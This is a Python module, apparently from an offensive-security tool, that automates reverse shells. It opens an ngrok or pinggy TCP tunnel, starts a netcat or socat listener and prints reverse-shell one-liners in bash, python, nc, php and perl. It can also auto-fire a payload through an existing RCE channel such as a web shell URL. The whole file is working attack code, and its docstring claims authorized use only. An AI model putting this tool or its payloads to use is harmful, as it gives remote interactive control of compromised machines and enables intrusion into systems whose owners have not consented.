"""Reverse-shell orchestration over a public tunnel.

The target is remote and the operator is behind NAT, so a reverse shell needs a
public ingress. This wires the whole flow into one command: bring up an ngrok
TCP tunnel, start a listener, print (or auto-fire via a known RCE channel) the
right payload for the tunnel's public host:port, and hand over the shell.

Only for authorized, in-scope targets. The operator runs this in their own
terminal, where the listener gives an interactive session.
"""
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

ACCENT = "\033[1;38;2;255;64;64m"
DIM = "\033[38;2;120;120;128m"
TEXT = "\033[38;2;225;225;230m"
RESET = "\033[0m"

NGROK_API = "http://127.0.0.1:4040/api/tunnels"


def free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def payloads(host: str, port: int) -> dict:
    """Reverse-shell one-liners that make the TARGET connect back to host:port."""
    return {
        "bash": f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
        "python": ("python3 -c 'import socket,subprocess,os,pty;"
                   f's=socket.socket();s.connect((\"{host}\",{port}));'
                   "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"),
        "nc": f"rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/.f",
        "php": (f'php -r \'$s=fsockopen("{host}",{port});'
                '$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);\''),
        "perl": (f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,'
                 'getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''),
    }


def start_ngrok(port: int, timeout: int = 25):
    """Launch `ngrok tcp <port>` and return (proc, public_host, public_port)."""
    if not shutil.which("ngrok"):
        raise RuntimeError("ngrok não está no PATH")
    proc = subprocess.Popen(["ngrok", "tcp", str(port), "--log", "stdout"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            raise RuntimeError("ngrok saiu na inicialização (authtoken? rede?)")
        try:
            data = json.loads(urllib.request.urlopen(NGROK_API, timeout=2).read())
            for t in data.get("tunnels", []):
                if t.get("proto") == "tcp" and t.get("public_url"):
                    m = re.match(r"tcp://([^:]+):(\d+)", t["public_url"])
                    if m:
                        return proc, m.group(1), int(m.group(2))
        except (urllib.error.URLError, OSError, ValueError):
            pass
        time.sleep(1)
    _kill(proc)
    raise RuntimeError("túnel ngrok não subiu a tempo")


def start_pinggy(port: int, timeout: int = 25):
    """Public TCP tunnel over SSH via pinggy.io — no account, no install, no card
    (ngrok's free tier blocks TCP). Returns (proc, public_host, public_port)."""
    if not shutil.which("ssh"):
        raise RuntimeError("ssh não está no PATH (necessário p/ pinggy)")
    cmd = ["ssh", "-p", "443", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
           f"-R0:localhost:{port}", "tcp@a.pinggy.io"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1, start_new_session=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            raise RuntimeError("pinggy/ssh encerrou na inicialização")
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.2)
            continue
        m = re.search(r"tcp://([a-z0-9.\-]+):(\d+)", line.replace("\r", ""))
        if m:
            # keep draining stdout so the ssh pipe never blocks the tunnel
            threading.Thread(target=lambda: [l for l in iter(proc.stdout.readline, "")],
                             daemon=True).start()
            return proc, m.group(1), int(m.group(2))
    _kill(proc)
    raise RuntimeError("pinggy não retornou endpoint a tempo")


def start_tunnel(port: int, provider: str = "auto"):
    """Bring up a public TCP tunnel. 'auto' prefers pinggy (works with no card),
    then ngrok. Returns (proc, host, port, provider_used)."""
    order = {"auto": ["pinggy", "ngrok"], "pinggy": ["pinggy"], "ngrok": ["ngrok"]}[provider]
    errors = []
    for prov in order:
        try:
            if prov == "pinggy":
                p, h, pub = start_pinggy(port)
            else:
                p, h, pub = start_ngrok(port)
            return p, h, pub, prov
        except RuntimeError as e:
            errors.append(f"{prov}: {e}")
    raise RuntimeError("nenhum túnel subiu — " + " | ".join(errors))


def _kill(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, OSError):
        pass


def fire_via_exec(exec_howto: str, payload: str, urlencode: bool = False) -> tuple[bool, str]:
    """Fire a (backgrounded) payload through a known RCE channel.

    exec_howto contains a literal __CMD__ placeholder (e.g.
    `curl 'http://host/sh.php?c=__CMD__'`). We background the reverse shell so
    the request returns instead of hanging on the live shell."""
    bg = f"nohup sh -c {_shq(payload)} >/dev/null 2>&1 &"
    sub = urllib.parse.quote(bg) if urlencode else bg
    cmd = exec_howto.replace("__CMD__", sub)
    try:
        r = subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True, timeout=20)
        return True, (r.stdout or r.stderr or "")[:400]
    except subprocess.SubprocessError as e:
        return False, str(e)


def _shq(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


def _listener_cmd(port: int, kind: str) -> list[str]:
    if kind == "socat" and shutil.which("socat"):
        # upgraded pty shell on the operator's terminal
        return ["socat", f"file:{os.ttyname(0) if sys.stdin.isatty() else '/dev/null'},raw,echo=0",
                f"tcp-listen:{port},reuseaddr"]
    return ["nc", "-lvnp", str(port)]


def pop_shell(exec_howto: str | None, method: str = "bash", lport: int | None = None,
              listener: str = "socat", urlencode: bool = False, provider: str = "auto") -> int:
    """Bring up tunnel + listener, (optionally) auto-fire, hand over the shell."""
    port = lport or free_port()
    print(f"{ACCENT}┌─ FOSC reverse shell{RESET}")
    print(f"{DIM}│ subindo túnel TCP (provider={provider}) na porta local {port}…{RESET}")
    try:
        tun_proc, host, pub, used = start_tunnel(port, provider)
    except RuntimeError as e:
        print(f"{ACCENT}✗ {e}{RESET}")
        print(f"{DIM}  ngrok free bloqueia TCP sem cartão; pinggy precisa de ssh e saída na 443.{RESET}")
        return 1
    print(f"{DIM}│ via {used}{RESET}")

    pl = payloads(host, pub)
    print(f"{ACCENT}│ endpoint público:{RESET} {TEXT}{host}:{pub}{RESET}  {DIM}(target conecta aqui){RESET}")
    print(f"{ACCENT}│ listener:{RESET} {listener if shutil.which(listener) else 'nc'} em :{port}")
    print(f"{ACCENT}│ payload [{method}] pra disparar na RCE:{RESET}")
    print(f"{TEXT}{pl.get(method, pl['bash'])}{RESET}")
    print(f"{DIM}│ (outros: {', '.join(k for k in pl if k != method)}){RESET}")

    if exec_howto and "__CMD__" in exec_howto:
        def _fire():
            time.sleep(2.0)  # let the listener bind first
            ok, out = fire_via_exec(exec_howto, pl.get(method, pl["bash"]), urlencode)
            tag = "disparado" if ok else "falhou"
            sys.stderr.write(f"\n{DIM}· payload {tag} via RCE{(': ' + out.strip()) if out.strip() else ''}{RESET}\n")
        threading.Thread(target=_fire, daemon=True).start()
        print(f"{ACCENT}└ auto-disparando a RCE e aguardando conexão…{RESET}\n")
    else:
        print(f"{ACCENT}└ dispare o payload acima na RCE do alvo e aguarde a conexão…{RESET}\n")

    lc = _listener_cmd(port, listener)
    try:
        subprocess.run(lc)  # foreground: this is the operator's interactive shell
    except KeyboardInterrupt:
        pass
    finally:
        _kill(tun_proc)
        print(f"\n{DIM}túnel encerrado.{RESET}")
    return 0


def howto_from_state(target: str) -> str | None:
    """Pull the exec channel from a confirmed RCE finding, if the run has one."""
    try:
        from .state import RunState
        for f in RunState(target).confirmed():
            if f.get("shell_obtained") and f.get("shell_howto"):
                return f["shell_howto"]
    except Exception:
        pass
    return None
